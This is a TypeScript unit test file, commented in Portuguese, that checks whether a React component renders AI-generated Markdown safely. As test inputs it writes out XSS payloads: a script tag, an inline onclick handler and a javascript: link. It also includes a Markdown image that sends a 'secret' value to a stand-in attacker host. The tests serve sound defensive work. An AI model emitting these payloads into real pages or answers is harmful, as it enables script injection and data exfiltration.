// @vitest-environment jsdom
//
// Só este ficheiro corre em jsdom (via pragma acima) — o resto da suite
// continua em "node" (vitest.config.ts), mais rápido, para não pagar o custo
// de um DOM completo em testes que não renderizam React. Cobre exatamente o
// que a Parte 4/10 do pedido de UX exige: que o Markdown das respostas da IA
// renderiza formatação, mas nunca HTML/scripts/links/imagens vindos do texto
// (conteúdo não confiável — ver comentário de segurança em ai-markdown.tsx).
import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { AiMarkdown } from "./ai-markdown";

describe("AiMarkdown", () => {
  it("renderiza títulos, negrito e listas", () => {
    const { container } = render(<AiMarkdown text={"## Resumo financeiro\n\n**Saldo disponível**\n\n- Item um\n- Item dois"} />);
    expect(container.querySelector("h2")?.textContent).toBe("Resumo financeiro");
    expect(container.querySelector("strong")?.textContent).toBe("Saldo disponível");
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });

  it("renderiza uma tabela GFM dentro de um contentor com scroll horizontal próprio", () => {
    const { container } = render(<AiMarkdown text={"| Data | Valor |\n|---|---:|\n| 2026-09-08 | 500 |"} />);
    expect(container.querySelector("table")).not.toBeNull();
    expect(container.querySelectorAll("td")).toHaveLength(2);
    // O <table> deve estar dentro de um contentor com overflow — nunca deixa a página inteira fazer scroll lateral.
    expect(container.querySelector(".overflow-x-auto table")).not.toBeNull();
  });

  it("nunca renderiza uma tag <script> vinda do texto — HTML bruto nunca é interpretado", () => {
    const { container } = render(<AiMarkdown text={'Olá<script>window.__pwned = true;</script> mundo'} />);
    expect(container.querySelector("script")).toBeNull();
    expect((window as unknown as { __pwned?: boolean }).__pwned).toBeUndefined();
  });

  it("nunca renderiza um <img> (mesmo via sintaxe Markdown) — sem vetor de exfiltração por imagem externa", () => {
    const { container } = render(<AiMarkdown text={"![aviso](https://evil.example.com/track.png?x=segredo)"} />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("nunca renderiza um <a> — sem links clicáveis, mesmo que o texto contenha um URL em Markdown", () => {
    const { container } = render(<AiMarkdown text={"[clica aqui](javascript:alert(1))"} />);
    expect(container.querySelector("a")).toBeNull();
  });

  it("um onclick/handler inline dentro de HTML bruto no texto nunca chega a atributo real do DOM", () => {
    const { container } = render(<AiMarkdown text={'<div onclick="window.__pwned2 = true">texto</div>'} />);
    expect(container.querySelector("[onclick]")).toBeNull();
    expect((window as unknown as { __pwned2?: boolean }).__pwned2).toBeUndefined();
  });

  it("texto simples sem Markdown continua legível (resposta curta, sem estrutura forçada)", () => {
    render(<AiMarkdown text="1 250 CVE" />);
    expect(screen.getByText("1 250 CVE")).toBeTruthy();
  });

  it("texto muito longo (ex: explicação financeira extensa) renderiza sem lançar exceção", () => {
    const longText = `## Explicação\n\n${"Este é um parágrafo repetido para simular uma resposta longa. ".repeat(200)}`;
    expect(() => render(<AiMarkdown text={longText} />)).not.toThrow();
  });
});
